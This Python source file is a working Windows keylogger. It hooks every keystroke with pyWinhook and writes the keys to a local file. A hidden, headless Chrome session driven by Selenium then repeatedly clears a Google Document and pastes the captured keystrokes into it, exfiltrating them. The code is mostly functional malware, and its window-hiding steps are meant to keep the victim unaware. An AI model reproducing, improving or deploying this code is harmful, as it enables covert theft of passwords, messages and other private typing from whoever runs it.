import win32console 
import pythoncom, pyWinhook 
import os
import sys
import threading
import time
import errno
import platform
import subprocess
import warnings
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import WebDriverException
from selenium.webdriver.common import utils
from selenium.webdriver.remote.webdriver import WebDriver as RemoteWebDriver
from selenium.webdriver.chrome import service, webdriver, remote_connection


class HiddenChromeService(service.Service):  # creates hidden Chrome service object

    def start(self):
        try:
            cmd = [self.path]
            cmd.extend(self.command_line_args())

            if platform.system() == 'Windows':
                info = subprocess.STARTUPINFO()
                info.dwFlags = subprocess.STARTF_USESHOWWINDOW
                info.wShowWindow = 0  # SW_HIDE (6 == SW_MINIMIZE)
            else:
                info = None

            self.process = subprocess.Popen(
                cmd, env=self.env,
                close_fds=platform.system() != 'Windows',
                startupinfo=info,
                stdout=self.log_file,
                stderr=self.log_file,
                stdin=subprocess.PIPE)
        except TypeError:
            raise
        except OSError as err:
            if err.errno == errno.ENOENT:
                raise WebDriverException(
                    "'%s' executable needs to be in PATH. %s" % (
                        os.path.basename(self.path), self.start_error_message)
                )
            elif err.errno == errno.EACCES:
                raise WebDriverException(
                    "'%s' executable may have wrong permissions. %s" % (
                        os.path.basename(self.path), self.start_error_message)
                )
            else:
                raise
        except Exception as e:
            raise WebDriverException(
                "Executable %s must be in path. %s\n%s" % (
                    os.path.basename(self.path), self.start_error_message,
                    str(e)))
        count = 0
        while True:
            self.assert_process_still_running()
            if self.is_connectable():
                break
            count += 1
            time.sleep(1)
            if count == 30:
                raise WebDriverException("Can't connect to the Service %s" % (
                    self.path,))


class HiddenChromeWebDriver(webdriver.WebDriver):  # creates hidden Chrome webdriver
    def __init__(self, executable_path="chromedriver", port=0,
                options=None, service_args=None,
                desired_capabilities=None, service_log_path=None,
                chrome_options=None, keep_alive=True):
        if chrome_options:
            warnings.warn('use options instead of chrome_options',
                        DeprecationWarning, stacklevel=2)
            options = chrome_options

        if options is None:
            # desired_capabilities stays as passed in
            if desired_capabilities is None:
                desired_capabilities = self.create_options().to_capabilities()
        else:
            if desired_capabilities is None:
                desired_capabilities = options.to_capabilities()
            else:
                desired_capabilities.update(options.to_capabilities())

        self.service = HiddenChromeService(
            executable_path,
            port=port,
            service_args=service_args,
            log_path=service_log_path)
        self.service.start()

        try:
            RemoteWebDriver.__init__(
                self,
                command_executor=remote_connection.ChromeRemoteConnection(
                    remote_server_addr=self.service.service_url,
                    keep_alive=keep_alive),
                desired_capabilities=desired_capabilities)
        except Exception:
            self.quit()
            raise
        self._is_remote = False


f = open("doclink.txt")
doc_link = f.read().rstrip("\n").strip()
f.close()
# gets link of target document

send_wait = 10
# specifies time to wait before writing key data to the document

win = win32console.GetConsoleWindow()

f = open("cleartext.txt")
clear_code = f.read()
f.close()
# gets the text code "CTRL+A, BACKSPACE" from the file that stores data on clearing a document


def OnKeyboardEvent(event):  # adds key to output file
    if event.Ascii == 5:
        sys.exit(1)

    f = open("output.txt", "r+") 
    buffer = f.read()
    f.truncate()
    f.close
    # reads from output file

    if event.Ascii == 0:  # if a key is a special character, it is handled, otherwise it becomes a standard character
        keylogs = "\\c\\"
    elif event.Ascii == 8:
        keylogs = "\\b\\"
    elif event.Ascii == 13:
        keylogs = "\\n\\"
    else:
        keylogs = chr(event.Ascii)
    
    buffer += keylogs
    # new data added to old data

    f = open("output.txt", "w")
    f.write(buffer)
    f.close()
    # data written to output file

    return 1


def get_driver():  # gets a silent Chrome driver
    from selenium import webdriver

    options_driver = webdriver.ChromeOptions()
    options_driver.add_argument('headless')
    options_driver.add_argument("--silent")
    
    driver = HiddenChromeWebDriver(chrome_options=options_driver)

    return driver


def write_to_doc():  # writes keylogger data to the Google Document
    driver = get_driver()

    while True:
        try:  # attempts to write to the Google Document
            driver.get(doc_link)

            f = open("output.txt", "r")
            send_text = f.read()
            f.close()

            doc = driver.find_element_by_xpath('//*[@id="kix-appview"]/div[7]/div/div[1]/div[1]/div/div/div/div[2]/div/div[2]/div[1]/div/div')
            driver.implicitly_wait(10)
            
            ActionChains(driver).move_to_element(doc).click(doc).send_keys(clear_code).perform()
            ActionChains(driver).move_to_element(doc).click(doc).send_keys(send_text).perform()
            time.sleep(send_wait)
        except:  # if it fails, the driver is recreated
            time.sleep(5)
            driver = get_driver()


hm = pyWinhook.HookManager() 
hm.KeyDown = OnKeyboardEvent

hm.HookKeyboard()

data_thread = threading.Thread(target=write_to_doc)
data_thread.start()
# starts seperate thread to write data to Google Document

pythoncom.PumpMessages()